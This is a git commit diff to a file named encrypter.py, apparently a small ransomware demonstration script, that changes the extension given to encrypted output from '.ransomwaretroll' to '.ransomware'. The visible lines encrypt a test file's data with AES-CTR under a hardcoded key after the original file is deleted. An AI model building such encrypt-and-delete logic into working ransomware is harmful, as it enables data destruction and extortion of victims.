fb82036e402b483cd2388f726a650d9c0d53e0f4
Flávio Araújo <96846477+flaviohcampp@users.noreply.github.com>
2024-12-09 09:03:18 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -8,7 +8,7 @@ os.remove(file_name)
 key = b"testeparadiorans"
 aes = pyaes.AESModeOfOperationCTR(key)
 crypto_data = aes.encrypt(file_data)
-new_file = "teste_decrypter.txt" + ".ransomwaretroll"
+new_file = "teste_decrypter.txt" + ".ransomware"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
